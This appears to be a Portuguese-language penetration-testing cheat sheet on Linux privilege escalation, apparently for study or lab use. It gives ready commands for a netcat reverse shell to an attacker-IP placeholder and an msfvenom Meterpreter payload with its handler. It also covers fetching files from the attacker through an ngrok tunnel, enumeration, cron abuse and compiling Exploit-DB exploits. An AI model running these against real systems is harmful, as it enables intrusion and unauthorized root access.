
# Linux Privilege escalation - Obtendo maiores privilégios

A escalada de privilégios ocorre quando um atacante busca obter mais permissões no sistema comprometido, seja explorando vulnerabilidades ou configurações inadequadas. Isso pode ser feito de várias formas, como exploração de serviços mal configurados, credenciais armazenadas e vulnerabilidades de software.

---

### Script para varrer toda a rede usando o teste de ping e filtrar IPs ativos

Para descobrir quais dispositivos estão ativos na rede, pode-se usar um simples script em Bash:

~~~bash
for ip in $(seq 1 254); do
  ping -c 1 192.168.1.$ip | grep "64 bytes" | awk '{print $4}' | tr -d ":" &
done
~~~

- Explicação:
  - O `seq 1 254` percorre todos os endereços da rede local.
 
  - O `ping -c 1` envia apenas um pacote ICMP por IP.
 
  - O `grep "64 bytes"` filtra as respostas dos hosts ativos.
 
  - O `awk '{print $4}' | tr -d ":"` extrai apenas o IP da resposta.

---

### Fazer Conexão com a Máquina Invadida

Depois de obter acesso inicial, pode ser necessário abrir uma conexão reversa para controle remoto contínuo. Algumas formas de fazer isso:

**Usando Netcat (nc)**

- Na máquina atacante (listener):

    ~~~bash
    nc -lvnp 4444
    ~~~

- Na máquina invadida (reverse shell):

    ~~~bash
    nc -e /bin/bash <IP-DO-ATACANTE> 4444
    ~~~

**Usando Metasploit**

- Criar um payload reverso:

    ~~~bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP-DO-ATACANTE> LPORT=4444 -f elf > shell.elf
    ~~~

- Executar um handler no Metasploit:

    ~~~bash
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST <IP-DO-ATACANTE>
    set LPORT 4444
    exploit
    ~~~

---

### Enviar Arquivos para a Máquina Invadida usando Ngrok

O Ngrok pode ser usado para criar um túnel seguro e transferir arquivos para a máquina invadida sem precisar expor diretamente um serviço.

**Passo a passo para enviar um arquivo:**

1. Na máquina atacante (criando um servidor HTTP usando Python)

    ~~~bash
    python3 -m http.server 8080
    ~~~

2. Criar um túnel no Ngrok:

    ~~~bash
    ngrok http 8080
    ~~~

    - *O Ngrok fornecerá um link público acessível de qualquer lugar.*

3. Na máquina invadida, baixar o arquivo:

    ~~~bash
    wget http://<URL_DO_NGROK>/arquivo
    ~~~

---

### SearchSploit

O SearchSploit é uma ferramenta para pesquisar exploits no banco de dados do Exploit-DB.

- Buscar exploits para um software específico:

    ~~~bash
    searchsploit apache
    ~~~

- Buscar exploits exatos para uma versão específica:

    ~~~bash
    searchsploit -w --cve CVE-2021-3156
    ~~~

- Copiar um exploit encontrado:

    ~~~bash
    cp /usr/share/exploitdb/exploits/linux/local/12345.c .
    ~~~

---

### Informações do Sistema

Após obter acesso ao sistema, é essencial coletar informações básicas sobre a máquina e verificar vulnerabilidades.

- Verificar versão do sistema operacional:

    ~~~bash
    uname -a
    lsb_release -a
    cat /etc/os-release
    ~~~

- Verificar arquitetura:

    ~~~bash
    arch
    ~~~

- Verificar permissões do usuário atual:

    ~~~bash
    whoami && id
    ~~~

---

### Cron Jobs

O cron é um agendador de tarefas que pode ser explorado para escalonamento de privilégios se scripts forem executados como root.

- Listar tarefas cron do usuário:

    ~~~bash
    crontab -l
    ~~~

- Listar tarefas cron do sistema:

    ~~~bash
    cat /etc/crontab
    ls -la /etc/cron.*
    ~~~

- Exploração de cron job mal configurado:

  - Se um script no cron job estiver sendo executado como root, mas puder ser modificado pelo atacante (`chmod 777` ou dono diferente de root), ele pode ser editado para executar comandos maliciosos.

---

### Netstat

A ferramenta `netstat` pode ser usada para identificar conexões de rede ativas e serviços em execução.

- Ver portas abertas e processos associados:

    ~~~bash
    netstat -tulnp
    ~~~

- Verificar conexões ativas:

    ~~~bash
    netstat -an
    ~~~

---

### Versão do Sudo

Verificar a versão do `sudo` pode revelar vulnerabilidades que permitam escalonamento de privilégios.

- Checar versão:

    ~~~bash
    sudo -V
    ~~~

- Exploração da vulnerabilidade CVE-2021-3156 (`Baron Samedit`):
  - Se a versão do `sudo` for vulnerável, pode-se usar um exploit público para ganhar acesso root.

---

### Exploit

Caso haja vulnerabilidades conhecidas no sistema, pode-se utilizar exploits para obter privilégios elevados.

- Baixar e compilar um exploit localmente:

    ~~~bash
    gcc exploit.c -o exploit
    chmod +x exploit
    ./exploit
    ~~~

- Executar um exploit direto do Exploit-DB:

    ~~~bash
    searchsploit -m linux/local/12345.c
    gcc 12345.c -o exploit && ./exploit
    ~~~

---